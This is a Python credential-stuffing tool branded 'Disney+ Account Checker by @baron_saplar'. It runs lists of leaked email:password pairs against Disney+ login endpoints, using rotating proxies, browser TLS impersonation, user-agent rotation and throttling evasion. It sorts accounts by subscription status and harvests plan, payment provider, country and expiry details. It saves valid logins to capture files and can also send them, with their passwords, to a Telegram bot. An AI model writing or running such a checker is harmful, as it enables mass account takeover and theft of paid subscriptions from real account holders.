import sys, os, re, json, time, random, threading, queue, uuid
from datetime import datetime, timezone
from collections import deque

if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

try:
    from curl_cffi import requests as creq
    CURL_OK = True
except ImportError:
    import requests as creq
    CURL_OK = False

import requests as plain_requests

TIMEOUT = 25
MAX_RETRY = 3

_ban_lock = threading.Lock()
_ban_until = 0.0

TG_TOKEN = ""
TG_CHAT = ""
_TG_INIT = False
_VID = "https://t.me/videotoolbaron/5"

G, R, Y, B, C, M, DIM, BD, RS = '\033[92m', '\033[91m', '\033[93m', '\033[94m', '\033[96m', '\033[95m', '\033[90m', '\033[1m', '\033[0m'
COLOR = {'HIT': G, 'BAD': R, 'FREE': Y, 'RESET': M, 'RETRY': B, 'BAN': Y}

DEVICE_AUTH = "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
REGISTER_URL = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
GRAPHQL_URL = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
SUBSCRIBERS_URL = "https://disney.api.edge.bamgrid.com/v2/subscribers"

LOGIN_QUERY = '    mutation login($input: LoginInput!) {        login(login: $input) {            account {                ...account                profiles {                    ...profile                }            }            actionGrant            activeSession {              ...session            }            identity {              ...identity          }        }    }    fragment identity on Identity {    attributes {        securityFlagged        createdAt        passwordResetRequired    }    flows {        marketingPreferences {            eligibleForOnboarding            isOnboarded        }        personalInfo {            eligibleForCollection            requiresCollection        }    }    personalInfo {        dateOfBirth        gender    }    subscriber {        subscriberStatus        subscriptionAtRisk        overlappingSubscription        doubleBilled        doubleBilledProviders        subscriptions {            id            groupId            state            partner            isEntitled            source {                sourceType                sourceProvider                sourceRef                subType            }            paymentProvider            product {                id                sku                offerId                promotionId                name                nextPhase {                    sku                    offerId                    campaignCode                    voucherCode                }                entitlements {                    id                    name                    desc                    partner                }                categoryCodes                redeemed {                    campaignCode                    redemptionCode                    voucherCode                }                bundle                bundleType                subscriptionPeriod                earlyAccess                trial {                    duration                }            }            term {                purchaseDate                startDate                expiryDate                nextRenewalDate                pausedDate                churnedDate                isFreeTrial            }            externalSubscriptionId,            cancellation {                type                restartEligible            }            stacking {                status                overlappingSubscriptionProviders                previouslyStacked                previouslyStackedByProvider            }        }    }}    fragment account on Account {    id    attributes {        blocks {            expiry            reason        }        consentPreferences {            dataElements {                name                value            }            purposes {                consentDate                firstTransactionDate                id                lastTransactionCollectionPointId                lastTransactionCollectionPointVersion                lastTransactionDate                name                status                totalTransactionCount                version            }        }        dssIdentityCreatedAt        email        emailVerified        lastSecurityFlaggedAt        locations {            manual {                country            }            purchase {                country                source            }            registration {                geoIp {                    country                }            }        }        securityFlagged        tags        taxId        userVerified    }    parentalControls {        isProfileCreationProtected    }    flows {        star {            isOnboarded        }    }}    fragment profile on Profile {    id    name    isAge21Verified    attributes {        avatar {            id            userSelected        }        isDefault        kidsModeEnabled        languagePreferences {            appLanguage            playbackLanguage            preferAudioDescription            preferSDH            subtitleAppearance {                backgroundColor                backgroundOpacity                description                font                size                textColor            }            subtitleLanguage            subtitlesEnabled        }        groupWatch {            enabled        }        parentalControls {            kidProofExitEnabled            isPinProtected        }        playbackSettings {            autoplay            backgroundVideo            prefer133            preferImaxEnhancedVersion            previewAudioOnHome            previewVideoOnHome        }    }    personalInfo {        dateOfBirth        gender        age    }    maturityRating {        ...maturityRating    }    personalInfo {        dateOfBirth        age        gender    }    flows {        personalInfo {            eligibleForCollection            requiresCollection        }        star {            eligibleForOnboarding            isOnboarded        }    }}fragment maturityRating on MaturityRating {    ratingSystem    ratingSystemValues    contentMaturityRating    maxRatingSystemValue    isMaxContentMaturityRating}    fragment session on Session {    device {        id        platform    }    entitlements    features {        coPlay    }    inSupportedLocation    isSubscriber    location {        type        countryCode        dma        asn        regionName        connectionType        zipCode    }    sessionId    experiments {        featureId        variantId        version    }    identity {        id    }    account {        id    }    profile {        id        parentalControls {            liveAndUnratedContent {                enabled            }        }    }    partnerName    preferredMaturityRating {        impliedMaturityRating        ratingSystem    }    homeLocation {        countryCode    }    portabilityLocation {        countryCode        type    }}'

_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]


class Stats:
    def __init__(self, total):
        self._lk = threading.Lock()
        self.total, self.done = total, 0
        self.hit = self.bad = self.free = self.reset = self.retry = self.ban = 0
        self._ts = deque(maxlen=300)
        self.t0 = time.time()

    def add(self, kind):
        with self._lk:
            self.done += 1
            attr = kind.lower()
            if hasattr(self, attr):
                setattr(self, attr, getattr(self, attr) + 1)
            self._ts.append(time.time())

    @property
    def cpm(self):
        now = time.time()
        with self._lk:
            return sum(1 for t in self._ts if now - t <= 60)

    @property
    def elapsed(self):
        s = int(time.time() - self.t0)
        return f"{s//60:02d}:{s%60:02d}"


_flock = threading.Lock()
def _save(path, line):
    with _flock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(line + '\n')


_plock = threading.Lock()
def _log(kind, msg):
    col = COLOR.get(kind, '')
    ts = datetime.now().strftime('%H:%M:%S')
    with _plock:
        sys.stdout.write(f"\r{' '*180}\r")
        sys.stdout.write(f"[{DIM}{ts}{RS}] {BD}{col}{kind:<6}{RS} {msg}\n")
        sys.stdout.flush()


def _bar(s):
    W = 34
    pct = s.done / s.total if s.total else 0
    fill = int(W * pct)
    bar = f"{G}{'█'*fill}{DIM}{'░'*(W-fill)}{RS}"
    line = (f"\r {bar} {BD}{s.done}/{s.total}{RS} {DIM}{pct*100:5.1f}%{RS} | "
            f"{G}HIT:{BD}{s.hit}{RS} {R}BAD:{s.bad}{RS} {Y}FREE:{s.free}{RS} "
            f"{M}RESET:{s.reset}{RS} {B}RETRY:{s.retry}{RS} | {C}CPM:{BD}{s.cpm}{RS} | {DIM}{s.elapsed}{RS}  ")
    with _plock:
        sys.stdout.write(line)
        sys.stdout.flush()


def _tg(text, fpath=None):
    global _TG_INIT
    if not TG_TOKEN or not TG_CHAT:
        return
    try:
        if not _TG_INIT:
            _TG_INIT = True
            try:
                plain_requests.post(
                    f"https://api.telegram.org/bot{TG_TOKEN}/sendVideo",
                    json={"chat_id": TG_CHAT, "video": _VID, "caption": "Disney+ Checker by @baron_saplar"},
                    timeout=15)
            except Exception:
                pass
        if fpath and os.path.isfile(fpath):
            with open(fpath, 'rb') as f:
                plain_requests.post(
                    f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument",
                    data={"chat_id": TG_CHAT, "caption": text[:1024], "parse_mode": "HTML"},
                    files={"document": f}, timeout=15)
            return
        plain_requests.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id": TG_CHAT, "text": text[:4096], "parse_mode": "HTML"},
            timeout=15)
    except Exception:
        pass


def _proxy_url(proxy_str):
    if not proxy_str:
        return None
    p = proxy_str.strip()
    if '://' in p:
        return p
    parts = p.split(':')
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{p}"


def _session(proxy_str=None):
    sess = creq.Session(impersonate="chrome124") if CURL_OK else creq.Session()
    pu = _proxy_url(proxy_str)
    if pu:
        sess.proxies = {'http': pu, 'https': pu}
    return sess


class ProxyPool:
    def __init__(self, proxies):
        self._list = proxies
        self._idx = 0
        self._lk = threading.Lock()

    def next(self):
        with self._lk:
            p = self._list[self._idx % len(self._list)]
            self._idx += 1
            return p


def _register_device(sess, ua):
    headers = {
        'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.9',
        'authorization': DEVICE_AUTH, 'Content-Type': 'application/json',
        'Origin': 'https://www.disneyplus.com', 'Referer': 'https://www.disneyplus.com/',
        'User-Agent': ua, 'x-application-version': 'd2adb22e',
        'x-bamsdk-client-id': 'disney-svod-3d9324fc',
        'x-bamsdk-platform': 'javascript/windows/chrome',
        'X-BAMSDK-Platform-Id': 'browser', 'x-bamsdk-version': 'd2adb22e-dplus-mlp',
    }
    body = {
        "query": "mutation registerDevice($input: RegisterDeviceInput!) { registerDevice(registerDevice: $input) { grant { grantType assertion } } }",
        "variables": {"input": {
            "deviceFamily": "browser", "applicationRuntime": "chrome", "deviceProfile": "windows",
            "deviceLanguage": "en-US",
            "attributes": {"osDeviceIds": [], "manufacturer": "microsoft", "model": None,
                           "operatingSystem": "windows", "operatingSystemVersion": "10.0",
                           "browserName": "chrome", "browserVersion": "131.0.6778.86"}
        }}
    }
    r = sess.post(REGISTER_URL, headers=headers, json=body, timeout=TIMEOUT)
    m = re.search(r'"accessToken":"(.*?)"', r.text)
    return (m.group(1) if m else ''), r.text


def _check_email(sess, ua, device_token, email):
    headers = {
        'accept': 'application/json', 'authorization': device_token,
        'content-type': 'application/json', 'user-agent': ua,
        'x-bamsdk-client-id': 'disney-svod-3d9324fc',
        'x-bamsdk-platform': 'android/google/handset', 'x-bamsdk-version': '9.20.0',
    }
    body = {"operationName": "check", "variables": {"email": email},
            "query": "query check($email: String!) { check(email: $email) { operations nextOperation } }"}
    r = sess.post(GRAPHQL_URL, headers=headers, json=body, timeout=TIMEOUT)
    return r.text


def _login(sess, ua, device_token, email, password):
    headers = {
        'accept': 'application/json', 'authorization': device_token,
        'content-type': 'application/json', 'user-agent': ua,
        'x-bamsdk-client-id': 'disney-svod-3d9324fc',
        'x-bamsdk-platform': 'android/google/handset', 'x-bamsdk-version': '9.20.0',
    }
    body = {"query": LOGIN_QUERY, "operationName": "login",
            "variables": {"input": {"email": email, "password": password}}}
    r = sess.post(GRAPHQL_URL, headers=headers, json=body, timeout=TIMEOUT)
    return r.text


def _subscribers(sess, ua, login_token):
    headers = {
        'authorization': f'Bearer {login_token}',
        'content-type': 'application/json; charset=utf-8',
        'origin': 'https://www.disneyplus.com', 'referer': 'https://www.disneyplus.com/',
        'user-agent': ua, 'x-bamsdk-client-id': 'disney-svod-3d9324fc',
        'x-bamsdk-platform': 'windows', 'x-bamsdk-version': '12.0',
    }
    r = sess.get(SUBSCRIBERS_URL, headers=headers, timeout=TIMEOUT)
    return r.text


def _check(email, password, proxy_str=None):
    global _ban_until
    ua = random.choice(_UA_POOL)

    for attempt in range(MAX_RETRY):
        wait = _ban_until - time.time()
        if wait > 0:
            _log('BAN', f'Global pause {wait:.0f}s')
            time.sleep(wait)

        try:
            sess = _session(proxy_str)

            device_token, dev_text = _register_device(sess, ua)
            if 'forbidden-location' in dev_text.lower() or '403 error' in dev_text.lower() or not device_token:
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 5))
                    continue
                return 'RETRY', 'device register failed', {}

            check_text = _check_email(sess, ua, device_token, email)
            check_low = check_text.lower()

            if '403 error' in check_low or 'cloudfront' in check_low:
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 5))
                    continue
                return 'RETRY', 'check geo-blocked', {}

            if any(k in check_text for k in ['"operations":["Register"', '"operations":["RegisterAccount"']):
                return 'BAD', '', {}
            if 'password-reset-required' in check_low or 'password reset required' in check_low:
                return 'RESET', 'password reset required', {}
            if '429' in check_low or 'throttled' in check_low:
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(3, 8))
                    continue
                return 'RETRY', 'check throttled', {}

            login_text = _login(sess, ua, device_token, email, password)
            low = login_text.lower()

            if 'bad-credentials' in low or 'bad credentials' in low or 'account is blocked' in low:
                return 'BAD', '', {}

            if 'password-reset-required' in low:
                return 'RESET', 'password reset required', {}

            if '403 error' in low:
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 6))
                    continue
                return 'RETRY', 'login 403', {}

            if '{"data":{"login"' not in login_text and 'issubscriber":true' not in low:
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 5))
                    continue
                return 'RETRY', 'unknown login response', {}

            info = {}
            m = re.search(r'\{"accessToken":"(.*?)"', login_text)
            login_token = m.group(1) if m else ''
            info['access_token'] = login_token

            m = re.search(r'"geoIp":\{"country":"(.*?)"', login_text)
            if m:
                info['country'] = m.group(1)
            m = re.search(r'"emailVerified":(.*?),', login_text)
            if m:
                info['email_verified'] = m.group(1)
            m = re.search(r'"isFreeTrial":(.*?)\},', login_text)
            if m:
                info['free_trial'] = m.group(1)
            m = re.search(r'"nextRenewalDate":"(.*?)T', login_text)
            if m:
                info['expiry'] = m.group(1)
            m = re.search(r'"isSubscriber":(.*?),', login_text)
            if m:
                info['is_subscriber'] = m.group(1)

            profiles = re.findall(r'"name":"(.*?)"', login_text)
            if profiles:
                info['profiles'] = profiles[:5]

            m = re.search(r',"earlyAccess":(.*?),', login_text)
            gohan = m.group(1) if m else None
            if gohan is not None:
                m2 = re.search(re.escape(f'"earlyAccess":{gohan}') + r',"name":"(.*?)"', login_text)
                if m2:
                    info['plan'] = m2.group(1)
                    if 'hulu' in m2.group(1).lower():
                        info['hulu'] = True

            if not login_token:
                return 'HIT', '', info

            sub_text = _subscribers(sess, ua, login_token)
            sub_low = sub_text.lower()

            if 'subscription.not.found' in sub_low or '"subscriberstatus":"churned"' in sub_low or 'no subscriber found' in sub_low:
                return 'FREE', '', info

            m = re.search(r'"subscriberStatus":"(.*?)"', sub_text)
            if m:
                info['subscriber_status'] = m.group(1)
            m = re.search(r'"billingCycle":"(.*?)"', sub_text)
            if m:
                info['billing_cycle'] = m.group(1)
            m = re.search(r'"name":"(.*?)"', sub_text)
            if m:
                info['plan'] = m.group(1)
            m = re.search(r'"toDate":"(.*?)T', sub_text)
            if m:
                info['expiry'] = m.group(1)
            m = re.search(r'"paymentProvider":"(.*?)"', sub_text)
            if m:
                info['payment_provider'] = m.group(1)

            if info.get('expiry'):
                try:
                    exp = datetime.strptime(info['expiry'], '%Y-%m-%d').replace(tzinfo=timezone.utc)
                    info['remaining_days'] = (exp - datetime.now(timezone.utc)).days
                except Exception:
                    pass

            if info.get('subscriber_status', '').upper() == 'ACTIVE' or info.get('is_subscriber') == 'true':
                return 'HIT', '', info
            if info.get('remaining_days') is not None and info['remaining_days'] < 0:
                return 'FREE', '', info

            return 'HIT', '', info

        except Exception as exc:
            if attempt < MAX_RETRY - 1:
                time.sleep(random.uniform(2, 5))
                continue
            return 'RETRY', str(exc)[:80], {}

    return 'RETRY', 'max retries', {}


def _format_hit(email, password, info):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    plan = info.get('plan', '-')
    sub = info.get('subscriber_status', '-')
    country = info.get('country', '-')
    expiry = info.get('expiry', '-')
    remaining = info.get('remaining_days', '-')
    billing = info.get('billing_cycle', '-')
    payment = info.get('payment_provider', '-')
    trial = info.get('free_trial', '-')
    verified = info.get('email_verified', '-')
    profiles = ', '.join(info.get('profiles', []))
    hulu = info.get('hulu', False)
    return (
        f"{'='*55}\n"
        f"  DISNEY+ HIT | {now}\n"
        f"  @baron_saplar\n"
        f"{'='*55}\n"
        f"  Email       : {email}\n"
        f"  Password    : {password}\n"
        f"  Plan        : {plan}\n"
        f"  Status      : {sub}\n"
        f"  Country     : {country}\n"
        f"  Billing     : {billing}\n"
        f"  Payment     : {payment}\n"
        f"  Expiry      : {expiry} ({remaining}d)\n"
        f"  Free Trial  : {trial}\n"
        f"  Verified    : {verified}\n"
        f"  Hulu        : {hulu}\n"
        f"  Profiles    : {profiles}\n"
        f"{'='*55}\n"
    )


def _tg_hit(email, password, info):
    plan = info.get('plan', '-')
    sub = info.get('subscriber_status', '-')
    country = info.get('country', '-')
    expiry = info.get('expiry', '-')
    remaining = info.get('remaining_days', '-')
    trial = info.get('free_trial', '-')
    verified = info.get('email_verified', '-')
    profiles = ', '.join(info.get('profiles', []))
    return (
        f"<b>DISNEY+ HIT</b>\n\n"
        f"<b>Email:</b> <code>{email}</code>\n"
        f"<b>Pass:</b> <code>{password}</code>\n"
        f"<b>Plan:</b> {plan}\n"
        f"<b>Status:</b> {sub}\n"
        f"<b>Country:</b> {country}\n"
        f"<b>Expiry:</b> {expiry} ({remaining}d)\n"
        f"<b>Free Trial:</b> {trial}\n"
        f"<b>Verified:</b> {verified}\n"
        f"<b>Profiles:</b> {profiles}\n\n"
        f"<i>@baron_saplar</i>"
    )


def _worker(q, pool, stats, out, hit_dir):
    while True:
        try:
            combo = q.get_nowait()
        except queue.Empty:
            break
        try:
            if ':' not in combo:
                q.task_done()
                continue
            email, password = combo.split(':', 1)
            email, password = email.strip(), password.strip()
            proxy = pool.next() if pool else None
            status, detail, info = _check(email, password, proxy)
            stats.add(status)
            ep = f"{email}:{password}"

            if status == 'HIT':
                plan = info.get('plan', '?')
                country = info.get('country', '?')
                remaining = info.get('remaining_days', '?')
                sub_status = info.get('subscriber_status', '?')
                line = (f"{ep} | Plan: {plan} | Status: {sub_status} | Country: {country} | "
                        f"FreeTrial: {info.get('free_trial','?')} | EmailVerified: {info.get('email_verified','?')} | "
                        f"Expiry: {info.get('expiry','?')} | RemainingDays: {remaining} | Hulu: {info.get('hulu', False)}")
                _log('HIT', f"{email} | {plan} | {sub_status} | {country} | {remaining}d")
                _save(out['hit'], line)

                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                cap_name = re.sub(r'[^\w@.]', '_', email)[:30]
                cap_path = os.path.join(hit_dir, f"{ts}_{cap_name}.txt")
                try:
                    with open(cap_path, 'w', encoding='utf-8') as f:
                        f.write(_format_hit(email, password, info))
                    _tg(_tg_hit(email, password, info), cap_path)
                except Exception:
                    _tg(_tg_hit(email, password, info))

            elif status == 'FREE':
                _log('FREE', f"{email} | no active subscription")
                _save(out['free'], ep)
            elif status == 'RESET':
                _log('RESET', f"{email}")
                _save(out['reset'], ep)
            elif status == 'BAD':
                _save(out['bad'], ep)
            else:
                _save(out['retry'], ep)
                if detail:
                    _log('RETRY', f"{email} | {detail}")

            _bar(stats)
        except Exception:
            pass
        finally:
            q.task_done()


BANNER = f"""
{C}{BD}
    Disney+ Account Checker                                
               
   @baron_saplar                                          
{RS}"""


def main():
    global TG_TOKEN, TG_CHAT
    os.system('')
    print(BANNER)
    if not CURL_OK:
        print(f"{Y}[!] curl_cffi not installed{RS}\n")

    combo_file = input(f"{C}[?]{RS} Combo file  (email:pass)    : ").strip().strip('"')
    proxy_file = input(f"{C}[?]{RS} Proxy file  (blank = none)  : ").strip().strip('"')
    tg_token   = input(f"{C}[?]{RS} Telegram token (blank=skip) : ").strip()
    tg_chat    = ""
    if tg_token:
        tg_chat = input(f"{C}[?]{RS} Telegram chat ID            : ").strip()
    threads_s  = input(f"{C}[?]{RS} Threads     [50]            : ").strip()
    out_dir    = input(f"{C}[?]{RS} Output dir  [disney_output]  : ").strip() or "disney_output"

    TG_TOKEN = tg_token
    TG_CHAT = tg_chat
    threads_n = int(threads_s) if threads_s.isdigit() else 50

    if not proxy_file or not os.path.exists(proxy_file):
        if threads_n > 5:
            print(f"{Y}[!]{RS} No proxies -- capping threads to 5")
            threads_n = 5

    if not os.path.exists(combo_file):
        print(f"{R}[!] File not found: {combo_file}{RS}")
        return

    with open(combo_file, encoding='utf-8', errors='replace') as f:
        combos = [ln.strip() for ln in f if ':' in ln.strip()]
    if not combos:
        print(f"{R}[!] No valid combos{RS}")
        return
    print(f"{G}[+]{RS} Loaded {BD}{len(combos)}{RS} combos")

    proxies = []
    if proxy_file and os.path.exists(proxy_file):
        with open(proxy_file, encoding='utf-8', errors='replace') as f:
            proxies = [ln.strip() for ln in f if ln.strip()]
        print(f"{G}[+]{RS} Loaded {BD}{len(proxies)}{RS} proxies")
    else:
        print(f"{Y}[!]{RS} No proxies -- direct connection")

    os.makedirs(out_dir, exist_ok=True)
    hit_dir = os.path.join(out_dir, "captures")
    os.makedirs(hit_dir, exist_ok=True)
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    out = {k: os.path.join(out_dir, f'{k}_{ts}.txt') for k in ('hit', 'bad', 'free', 'reset', 'retry')}

    print(f"{C}[*]{RS} Output   -> {BD}{out_dir}/{RS}")
    print(f"{C}[*]{RS} Telegram -> {BD}{'ON' if TG_TOKEN else 'OFF'}{RS}")
    print(f"{C}[*]{RS} Starting   {BD}{threads_n} threads{RS} | {BD}{len(combos)} combos{RS} | TLS: {BD}{'ON' if CURL_OK else 'OFF'}{RS}\n")

    q = queue.Queue()
    for cb in combos:
        q.put(cb)

    pool = ProxyPool(proxies) if proxies else None
    stats = Stats(len(combos))
    actual = min(threads_n, len(combos))

    threads = []
    for _ in range(actual):
        t = threading.Thread(target=_worker, args=(q, pool, stats, out, hit_dir), daemon=True)
        t.start()
        threads.append(t)

    try:
        q.join()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Stopped.{RS}")

    s = stats
    summary = (f"\n\n{BD}{'='*56}{RS}\n"
               f"  {G}{BD}HIT    : {s.hit}{RS}\n"
               f"  {R}BAD    : {s.bad}{RS}\n"
               f"  {Y}FREE   : {s.free}{RS}\n"
               f"  {M}RESET  : {s.reset}{RS}\n"
               f"  {B}RETRY  : {s.retry}{RS}\n"
               f"  Total  : {s.done} / {s.total}\n"
               f"  Time   : {s.elapsed}\n"
               f"{BD}{'='*56}{RS}\n")
    print(summary)

    if TG_TOKEN and TG_CHAT:
        _tg(f"<b>Disney+ Checker Done</b>\n\n"
            f"HIT: {s.hit} | BAD: {s.bad} | FREE: {s.free}\n"
            f"RESET: {s.reset} | RETRY: {s.retry}\n"
            f"Total: {s.done}/{s.total} | Time: {s.elapsed}\n\n"
            f"<i>@baron_saplar</i>")

    print(f"  Output -> {BD}{out_dir}/{RS}")
    for k, p in out.items():
        if os.path.exists(p) and os.path.getsize(p) > 0:
            print(f"    {k.upper():6} : {os.path.basename(p)}  ({os.path.getsize(p):,} bytes)")
    print()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.")
